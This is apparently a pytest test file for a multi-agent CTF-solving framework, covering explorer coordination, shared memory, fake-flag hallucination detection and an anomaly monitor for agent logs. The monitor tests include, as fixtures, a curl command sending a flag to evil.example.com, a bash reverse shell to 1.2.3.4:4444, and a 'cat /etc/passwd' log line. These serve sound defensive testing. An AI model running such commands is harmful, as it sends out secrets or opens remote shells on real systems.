"""多 Agent 协作 + 共享记忆 + 幻觉检测（F3-007/008/009/013）测试。

覆盖：
- --multi-agent 语义：spawn N 个方向探索 agent，第一个解出者胜出（F3-007）
- 异步同步记忆：探索者 A 的发现并入中心黑板，晚启动探索者 B 的查询
  注入 A 的发现（F3-008）
- 记忆压缩：Fact 超阈值 → 摘要 Hint 落黑板
- 幻觉检测：畸形候选 flag 被三重校验门拒绝并公示（F3-009）
- 对手监控：日志中的异常行为产生告警（F3-013 集成）
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import pytest

from fulilian_ctf.blackboard import (
    BLACKBOARD_FILENAME,
    Blackboard,
    Fact,
    load_blackboard,
    save_blackboard,
)
from fulilian_ctf.dispatcher import Project
from fulilian_ctf.monitor import analyze_tool_call, scan_log_for_anomalies
from fulilian_ctf.multi_agent import (
    COMPRESS_THRESHOLD,
    MemoryCompressor,
    SharedMemory,
    build_explorer_description,
    detect_hallucinations,
    merge_all_boards,
    resolve_directions,
    run_multi_agent,
)
from fulilian_ctf.solver import SolverResult


# ── F3-007 多 Agent 协作 ──────────────────────────────────────────────────

def test_multi_agent_winner_stops_others(tmp_path):
    """explorer#0 解出后其余探索者收到停止信号被终止。"""
    base = tmp_path / "ma"
    project = Project(challenge_id="ma-01", challenge_dir=str(base))

    def impl(project_, work_dir_, model_, queue_):
        d = Path(work_dir_)
        if "explore-0" in str(d):
            time.sleep(0.3)  # 让其他 explorer 先启动（覆盖停止感知分支）
            d.joinpath("FLAG").write_text("flag{first}\n", encoding="utf-8")
        else:
            time.sleep(30)  # 应在 0.3s 后被终止
        queue_.put(SolverResult(ok=True, exit_code=0))

    started = time.time()
    result = run_multi_agent(
        project, n_direct_explorers=2, timeout=20,
        solver_fn=impl, quiet=True,
    )
    elapsed = time.time() - started

    assert result.solved
    assert result.flag == "flag{first}"
    assert result.winner_index == 0
    assert elapsed < 10, f"took {elapsed:.1f}s — losers were not stopped"
    assert len(result.explorers) == 2
    assert (base / "FLAG").read_text().strip() == "flag{first}"


def test_multi_agent_directions_injected(tmp_path):
    """每个探索者的查询描述包含其分配方向（F3-007 方向注入）。"""
    import multiprocessing

    base = tmp_path / "ma2"
    project = Project(challenge_id="ma-02", challenge_dir=str(base))
    seen_descriptions = multiprocessing.Manager().list()

    def impl(project_, work_dir_, model_, queue_):
        seen_descriptions.append(project_.description)
        queue_.put(SolverResult(ok=False, exit_code=1, error="nope"))

    result = run_multi_agent(
        project,
        directions=["dir-alpha", "dir-beta"],
        n_direct_explorers=3,   # 方向循环：alpha, beta, alpha
        timeout=15, solver_fn=impl, quiet=True,
    )
    assert not result.solved
    assert len(seen_descriptions) == 3
    descs = list(seen_descriptions)
    assert sum("dir-alpha" in d for d in descs) == 2
    assert sum("dir-beta" in d for d in descs) == 1


def test_multi_agent_default_directions_fallback(tmp_path):
    """无显式方向且黑板无 Intent → 内置默认方向。"""
    dirs = resolve_directions(None, board_path=tmp_path / "no.json")
    assert dirs  # DEFAULT_DIRECTIONS
    assert dirs == resolve_directions(None, board_path=tmp_path / "no.json")


def test_multi_agent_directions_from_blackboard_intents(tmp_path):
    """黑板有 open Intent → 作为探索方向。"""
    from fulilian_ctf.blackboard import Intent

    board = Blackboard(challenge_id="c")
    board.add_intent(Intent(goal="attack the login form", approach="sqli"))
    save_blackboard(board, tmp_path / BLACKBOARD_FILENAME)
    dirs = resolve_directions(None, board_path=tmp_path / BLACKBOARD_FILENAME)
    assert dirs == ["attack the login form"]


# ── F3-008 异步同步记忆 ───────────────────────────────────────────────────

def test_shared_memory_publish_and_flag():
    """共享记忆：facts 按探索者分桶去重；flag 先到先得。"""
    shared = SharedMemory()
    shared.publish_facts(0, ["fact-a", "fact-b"])
    shared.publish_facts(0, ["fact-a", "fact-c"])  # fact-a 去重
    assert dict(shared.data["facts"])[0] == ["fact-a", "fact-b", "fact-c"]

    assert shared.try_publish_flag("flag{x}", 1) is True
    assert shared.try_publish_flag("flag{y}", 2) is False  # 先到先得
    assert shared.data["flag"] == "flag{x}"
    assert shared.stop_event.is_set()


def test_merge_all_boards_dedupes(tmp_path):
    """合并循环：探索者黑板新 Fact/死路并入中心黑板，content 去重。"""
    base = tmp_path
    parent = Blackboard(challenge_id="c")
    parent.add_fact(Fact(content="already known", source="seed"))

    exp0 = tmp_path / "explore-0"
    exp0.mkdir()
    b0 = Blackboard(challenge_id="c")
    b0.add_fact(Fact(content="already known", source="solver"))   # 重复
    b0.add_fact(Fact(content="new finding from A", source="solver"))
    b0.mark_dead_end("dead path A")
    save_blackboard(b0, exp0 / BLACKBOARD_FILENAME)

    exp1 = tmp_path / "explore-1"
    exp1.mkdir()
    b1 = Blackboard(challenge_id="c")
    b1.add_fact(Fact(content="new finding from A", source="solver"))  # 跨探索者重复
    b1.add_fact(Fact(content="B found something else", source="solver"))
    save_blackboard(b1, exp1 / BLACKBOARD_FILENAME)

    added = merge_all_boards([exp0, exp1], parent)
    contents = {f.content for f in parent.get_facts()}
    assert contents == {"already known", "new finding from A", "B found something else"}
    assert added == 2
    assert "dead path A" in parent.dead_ends


def test_late_explorer_sees_earlier_findings(tmp_path):
    """异步同步记忆：晚启动探索者的查询注入早探索者的发现。"""
    shared = SharedMemory()
    shared.publish_facts(0, ["A found /admin backup"])
    desc = build_explorer_description(
        Project(challenge_id="c"), "recon", shared_facts=["A found /admin backup"]
    )
    assert "A found /admin backup" in desc
    assert "do not repeat" in desc


def test_memory_compressor_threshold(tmp_path):
    """记忆压缩：Fact 超阈值 → 摘要写入 Hint（source=memory-compressor）。"""
    board = Blackboard(challenge_id="c")
    for i in range(COMPRESS_THRESHOLD + 2):
        board.add_fact(Fact(content=f"finding {i}", source="s"))
    save_blackboard(board, tmp_path / BLACKBOARD_FILENAME)

    comp = MemoryCompressor(tmp_path / BLACKBOARD_FILENAME, interval=999, threshold=COMPRESS_THRESHOLD)
    summary = comp.tick_once()
    assert summary and "finding" in summary

    reloaded = load_blackboard(tmp_path / BLACKBOARD_FILENAME)
    hints = [h for h in reloaded.hints if h.source == "memory-compressor"]
    assert len(hints) == 1


def test_memory_compressor_below_threshold(tmp_path):
    board = Blackboard(challenge_id="c")
    board.add_fact(Fact(content="one fact", source="s"))
    save_blackboard(board, tmp_path / BLACKBOARD_FILENAME)
    comp = MemoryCompressor(tmp_path / BLACKBOARD_FILENAME, interval=999)
    assert comp.tick_once() is None


def test_memory_compressor_injected_llm(tmp_path):
    """压缩函数可注入（LLM 润色路径）。"""
    board = Blackboard(challenge_id="c")
    for i in range(20):
        board.add_fact(Fact(content=f"fact {i}", source="s"))
    save_blackboard(board, tmp_path / BLACKBOARD_FILENAME)
    comp = MemoryCompressor(
        tmp_path / BLACKBOARD_FILENAME, interval=999,
        compress_fn=lambda facts: "LLM-SUMMARY",
    )
    assert comp.tick_once() == "LLM-SUMMARY"


# ── F3-009 幻觉检测 ───────────────────────────────────────────────────────

def test_detect_hallucinations_rejects_fake_flag(tmp_path):
    """过不了三重校验门的候选被判幻觉；真实 flag 不报。

    - FLAG 文件里的占位符 ``flag{...}``（题干示例）→ REJECTED
    - 日志里格式不匹配任何已知模式的候选 → PENDING
    """
    d = tmp_path / "explore-0"
    d.mkdir()
    (d / "FLAG").write_text("flag{...}\n", encoding="utf-8")
    (d / "solver.log").write_text(
        "attempt 1: candidate misc{has spaces} looks like a flag\n"
        "$ cat /etc/passwd\n",
        encoding="utf-8",
    )
    records = detect_hallucinations(d, 0)
    candidates = {r["candidate"] for r in records}
    assert any("flag{...}" in c for c in candidates)
    assert any("misc{has spaces}" in c for c in candidates)

    # 真实 flag：evidence 里逐字出现 → CONFIRMED，不是幻觉
    (d / "FLAG").write_text("flag{real_one_42}\n", encoding="utf-8")
    (d / "solver.log").write_text(
        "we found flag{real_one_42} in the response body, confirmed correct",
        encoding="utf-8",
    )
    records2 = detect_hallucinations(d, 0)
    assert records2 == []


def test_hallucination_detector_loop_publishes(tmp_path):
    """检测循环：幻觉记录 → 共享记忆 + 中心黑板公示。"""
    exp = tmp_path / "explore-0"
    exp.mkdir()
    (exp / "FLAG").write_text("flag{...}\n", encoding="utf-8")
    board_path = tmp_path / BLACKBOARD_FILENAME
    save_blackboard(Blackboard(challenge_id="c"), board_path)

    shared = SharedMemory()
    from fulilian_ctf.multi_agent import HallucinationDetector

    det = HallucinationDetector([exp], shared, board_path, interval=999)
    new = det.tick_once()
    assert len(new) >= 1
    assert len(shared.data["hallucinations"]) >= 1
    board = load_blackboard(board_path)
    hallu_facts = [f for f in board.get_facts() if f.content.startswith("HALLUCINATION")]
    assert len(hallu_facts) >= 1
    # 再跑一轮不重复记录
    assert det.tick_once() == []


def test_multi_agent_solved_flag_survives_hallucination_check(tmp_path):
    """端到端：胜者 flag 通过校验门 → 判 SOLVED；幻觉 flag 不影响。"""
    base = tmp_path / "ma3"
    project = Project(challenge_id="ma-03", challenge_dir=str(base))

    def impl(project_, work_dir_, model_, queue_):
        d = Path(work_dir_)
        d.joinpath("FLAG").write_text("flag{true_flag_1234}\n", encoding="utf-8")
        d.joinpath("solver.log").write_text(
            "confirmed flag{true_flag_1234} works\n", encoding="utf-8"
        )
        b = Blackboard(challenge_id=project_.challenge_id)
        b.add_fact(Fact(content="decoded base64 payload", source="solver"))
        save_blackboard(b, d / BLACKBOARD_FILENAME)
        queue_.put(SolverResult(ok=True, exit_code=0))

    result = run_multi_agent(
        project, n_direct_explorers=2, timeout=20,
        solver_fn=impl, quiet=True,
    )
    assert result.solved
    assert result.flag == "flag{true_flag_1234}"
    assert result.facts_shared >= 1
    assert result.hallucinations == []


# ── F3-013 对手监控（multi_agent 集成 + 纯函数）────────────────────────────

def test_monitor_flags_exfil_attempt():
    alerts = scan_log_for_anomalies(
        "curl https://evil.example.com -d 'flag{secret_flag_here}'"
    )
    assert any(a.label == "flag-exfil" for a in alerts)
    assert all(a.level in ("high", "medium") for a in alerts)


def test_monitor_clean_log_is_silent():
    assert scan_log_for_anomalies("nmap scan done; found /admin; base64 decode ok") == []


def test_analyze_tool_call_reverse_shell():
    alerts = analyze_tool_call("bash", "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'")
    assert any(a.label == "reverse-shell" for a in alerts)


def test_run_multi_agent_collects_alerts(tmp_path):
    """探索者日志里的异常行为进入 run_multi_agent 结果的 alerts。"""
    base = tmp_path / "ma4"
    project = Project(challenge_id="ma-04", challenge_dir=str(base))

    def impl(project_, work_dir_, model_, queue_):
        d = Path(work_dir_)
        d.joinpath("solver.log").write_text(
            "curl https://evil.example.com -d 'flag{leak_me_now}'\n", encoding="utf-8"
        )
        queue_.put(SolverResult(ok=False, exit_code=1, error="done"))

    result = run_multi_agent(
        project, n_direct_explorers=1, timeout=10,
        solver_fn=impl, quiet=True,
    )
    assert any(a["label"] == "flag-exfil" for a in result.alerts)
